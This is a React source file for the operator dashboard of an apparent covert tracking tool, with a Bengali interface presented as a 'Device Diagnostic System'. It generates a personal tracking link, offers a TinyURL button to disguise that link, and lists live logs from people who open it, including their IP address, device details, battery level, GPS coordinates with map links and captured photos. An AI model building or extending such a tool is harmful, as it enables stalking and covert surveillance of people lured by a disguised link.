
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';
import { useNavigate } from 'react-router-dom';

interface LogEntry {
  id: string;
  timestamp: any;
  device?: {
    userAgent: string;
    ram: any;
    cores: any;
    screen: string;
  };
  battery?: { level: number; charging: boolean };
  location?: { 
    lat: number; 
    lng: number; 
    altitude?: number; 
    speed?: number; 
    heading?: number;
    accuracy?: number;
  };
  photoUrls?: string[];
  ip?: string;
  status: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [profile, setProfile] = useState<any>(null);
  const [copySuccess, setCopySuccess] = useState(false);
  const [shortUrl, setShortUrl] = useState('');
  const [shortening, setShortening] = useState(false);
  const navigate = useNavigate();
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  useEffect(() => {
    if (!db) return;

    // Fetch user profile
    const fetchProfile = async () => {
      const docRef = doc(db, "users", user.uid);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) {
        setProfile(docSnap.data());
      }
    };
    fetchProfile();

    const q = query(
      collection(db, "logs"), 
      where("userId", "==", user.uid)
    );

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as LogEntry[];

      data.sort((a, b) => {
        const timeA = a.timestamp?.seconds || 0;
        const timeB = b.timestamp?.seconds || 0;
        return timeB - timeA;
      });

      setLogs(data);
      setLoading(false);
    }, (error) => {
      console.error("Firebase Snapshot Error:", error);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [user.uid]);

  const handleSignOut = () => {
    signOut(auth);
    navigate('/login');
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const shortenWithTinyUrl = async () => {
    setShortening(true);
    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      if (response.ok) {
        const url = await response.text();
        setShortUrl(url);
      } else {
        throw new Error('Failed to shorten');
      }
    } catch (err) {
      alert('লিংক শর্ট করতে সমস্যা হয়েছে।');
    } finally {
      setShortening(false);
    }
  };

  const latestLog = logs[0] || null;

  return (
    <div className="min-h-screen bg-slate-50 font-['Hind_Siliguri']">
      <nav className="bg-white border-b border-gray-100 px-6 py-4 flex justify-between items-center sticky top-0 z-10 shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-200">
            <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800">অ্যাডমিন ড্যাশবোর্ড</h1>
        </div>
        <button onClick={handleSignOut} className="bg-red-50 text-red-600 font-bold text-sm px-5 py-2.5 rounded-xl hover:bg-red-600 hover:text-white transition-all">লগ আউট</button>
      </nav>

      <main className="max-w-7xl mx-auto p-4 md:p-8 space-y-8">
        {/* Welcome Banner */}
        <div className="bg-gradient-to-r from-blue-600 to-indigo-700 p-8 rounded-3xl text-white shadow-xl">
           <h2 className="text-2xl font-bold">হ্যালো {profile?.fullName || user.displayName || 'ইউজার'},</h2>
           <p className="mt-2 text-blue-100">আপনার অ্যাকাউন্টটি সফলভাবে নিবন্ধিত হয়েছে এবং ড্যাশবোর্ড সক্রিয় আছে।</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
            <p className="text-gray-400 text-sm font-bold uppercase mb-1">মোট রিপোর্ট</p>
            <h3 className="text-4xl font-black text-blue-600">{logs.length}</h3>
          </div>
          <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
            <p className="text-gray-400 text-sm font-bold uppercase mb-1">ব্যাটারি (সর্বশেষ)</p>
            <h3 className="text-4xl font-black text-green-500">{latestLog?.battery ? `${latestLog.battery.level}%` : '--'}</h3>
          </div>
          <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
            <p className="text-gray-400 text-sm font-bold uppercase mb-1">ডিভাইস (সর্বশেষ)</p>
            <h3 className="text-lg font-bold text-gray-800 truncate">{latestLog?.device?.userAgent.split(')')[0].split('(')[1] || 'অপেক্ষমান...'}</h3>
          </div>
        </div>

        <div className="bg-white p-8 rounded-3xl shadow-sm border border-gray-100">
          <h3 className="text-lg font-black text-gray-800 mb-4 flex items-center gap-2">আপনার ট্র্যাকিং লিংক</h3>
          <div className="space-y-4">
            <div className="flex flex-col md:flex-row gap-3">
              <input readOnly value={trackerLink} className="flex-1 bg-gray-50 px-4 py-4 rounded-xl border border-gray-200 font-mono text-xs text-gray-500" />
              <button onClick={() => copyToClipboard(trackerLink)} className="bg-blue-600 text-white px-8 py-4 rounded-xl font-bold">{copySuccess ? "কপি হয়েছে!" : "লিংক কপি"}</button>
              <button onClick={shortenWithTinyUrl} disabled={shortening} className="bg-slate-800 text-white px-8 py-4 rounded-xl font-bold disabled:opacity-50">{shortening ? "শর্ট হচ্ছে..." : "TinyURL শর্ট"}</button>
            </div>
            {shortUrl && (
              <div className="p-4 bg-blue-50 border border-blue-100 rounded-2xl flex items-center justify-between">
                <div>
                  <p className="text-[10px] font-bold text-blue-400 uppercase">শর্ট লিংক তৈরি হয়েছে</p>
                  <p className="font-bold text-blue-700">{shortUrl}</p>
                </div>
                <button onClick={() => copyToClipboard(shortUrl)} className="text-blue-600 font-bold">কপি করুন</button>
              </div>
            )}
          </div>
        </div>

        <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-6 border-b border-gray-50 flex justify-between items-center">
            <h3 className="text-lg font-black text-gray-800">লাইভ ডাটা লগ ({logs.length})</h3>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-left">
              <thead className="bg-gray-50 text-gray-400 text-[10px] font-black uppercase tracking-widest">
                <tr>
                  <th className="px-6 py-5">সময়</th>
                  <th className="px-6 py-5">ডিভাইস ও IP</th>
                  <th className="px-6 py-5">GPS ও মেটাডাটা</th>
                  <th className="px-6 py-5 text-center">ছবি (Photos)</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-50">
                {logs.length === 0 ? (
                  <tr><td colSpan={4} className="px-6 py-24 text-center text-gray-400 font-bold">কোনো ডাটা পাওয়া যায়নি</td></tr>
                ) : (
                  logs.map((log) => (
                    <tr key={log.id} className="hover:bg-blue-50/20 transition-all">
                      <td className="px-6 py-5 whitespace-nowrap">
                        <p className="text-xs font-bold text-gray-800">{log.timestamp?.toDate().toLocaleString('bn-BD')}</p>
                      </td>
                      <td className="px-6 py-5">
                        <p className="text-[10px] font-bold text-gray-500 truncate max-w-[150px]">{log.device?.userAgent}</p>
                        <p className="text-xs font-bold text-blue-600 font-mono mt-1">{log.ip || 'Unknown IP'}</p>
                      </td>
                      <td className="px-6 py-5">
                        {log.location ? (
                          <div className="space-y-1">
                            <a href={`https://www.google.com/maps?q=${log.location.lat},${log.location.lng}`} target="_blank" className="text-blue-600 font-bold text-xs underline block flex items-center gap-1">
                               <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd"></path></svg>
                               লোকেশন দেখুন
                            </a>
                            <p className="text-[9px] text-gray-400">
                              Lat: {log.location.lat.toFixed(4)}, Lng: {log.location.lng.toFixed(4)}
                            </p>
                          </div>
                        ) : <span className="text-xs text-red-300 font-bold">GPS Blocked</span>}
                      </td>
                      <td className="px-6 py-5">
                        <div className="flex justify-center gap-1 flex-wrap">
                          {log.photoUrls && log.photoUrls.length > 0 ? log.photoUrls.map((url, i) => (
                            <img key={i} src={url} className="w-10 h-10 rounded-lg object-cover cursor-pointer border-2 border-white shadow-sm hover:scale-150 transition-transform" onClick={() => window.open(url)} />
                          )) : <span className="text-xs text-gray-300">No Image</span>}
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        <footer className="text-center py-10 opacity-40">
           <p className="text-sm font-bold uppercase tracking-widest text-gray-500">Device Diagnostic System</p>
           <p className="text-xs mt-1">Developed by <span className="text-blue-600">Arefin Foysal</span></p>
        </footer>
      </main>
    </div>
  );
};

export default Dashboard;
